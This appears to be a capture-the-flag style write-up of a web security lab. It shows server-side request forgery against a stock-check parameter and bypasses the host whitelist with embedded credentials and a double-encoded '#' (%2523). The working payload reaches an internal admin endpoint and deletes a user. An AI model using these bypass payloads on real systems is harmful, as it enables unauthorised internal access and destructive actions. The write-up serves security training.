`stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1`

decoding it :

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1

1- trying 127.0.0.1 :

![image](https://user-images.githubusercontent.com/67979878/128301003-3d057b64-2514-4309-a183-3c460d7ac5cb.png)

same case with 127.1 and 2130706433 and also with internal ips' 192.168.x.x

keep printing "External stock check host must be stock.weliketoshop.net"

Bypassing :

example :
```
www.google.com@www.facebook.com              :will direct you to facebook 
https://www.google.com/#www.facebook.com     :will direct you to google 
https://www.facebook.com/#@www.google.com/   :will direct you to facebook 
hence that useful information let's try :
```

https://www.google.com%2523@www.facebook.com/about   : direct you to facebook.about


solution :
```
Visit a product, click "Check stock", intercept the request in Burp Suite, and send it to Burp Repeater.
Change the URL in the stockApi parameter to http://127.0.0.1/ and observe that the application is parsing the URL, extracting the hostname, and validating it against a whitelist.
Change the URL to http://username@stock.weliketoshop.net/ and observe that this is accepted, indicating that the URL parser supports embedded credentials.
Append a # to the username and observe that the URL is now rejected.
Double-URL encode the # to %2523 and observe the extremely suspicious "Internal Server Error" response, indicating that the server may have attempted to connect to "username".
Change the URL to http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos to access the admin interface and delete the target user.

```
hence that this works :


http://localhost%2523@stock.weliketoshop.net/admin/delete?username=carlos  



